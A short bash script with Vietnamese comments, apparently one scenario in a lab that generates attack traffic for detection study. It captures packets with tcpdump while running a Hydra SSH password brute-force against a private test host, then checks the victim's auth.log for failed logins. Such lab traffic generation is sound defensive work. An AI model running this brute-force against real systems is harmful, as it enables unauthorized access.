#!/bin/bash
set -euo pipefail
# Kịch bản 2: Brute-force SSH bằng Hydra

TARGET="172.28.0.10"
IFACE="eth0"
SSH_USER="testuser"
WORDLIST="/root/pass.txt"
AUTH_LOG="/root/logs/victim/auth.log"

PCAP_DIR="${PCAP_DIR:-/root/pcap}"
mkdir -p "$PCAP_DIR"
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="$PCAP_DIR/02_ssh_bruteforce_$TIME.pcap"
OUT="$PCAP_DIR/02_ssh_bruteforce_$TIME.txt"

echo "Bắt đầu bắt gói tin, lưu vào $PCAP"
tcpdump -i "$IFACE" -U -w "$PCAP" host "$TARGET" and port 22 &
PID=$!
trap 'kill -INT "$PID" 2>/dev/null || true; wait "$PID" 2>/dev/null || true' EXIT
sleep 0.3
kill -0 "$PID"
sleep 2

echo "Chạy hydra dò mật khẩu SSH vào $TARGET"
hydra -l $SSH_USER -P $WORDLIST -t 4 -f $TARGET ssh -o $OUT

sleep 3
kill -INT "$PID"
wait "$PID" || true
trap - EXIT

echo "Kiểm tra auth.log xem có dòng Failed password không"
if [ -f "$AUTH_LOG" ]; then
    grep "Failed password" "$AUTH_LOG" | tail -n 10 || true
else
    echo "Không thấy file $AUTH_LOG, kiểm tra lại đường dẫn mount volume"
fi

echo "Xong rồi."
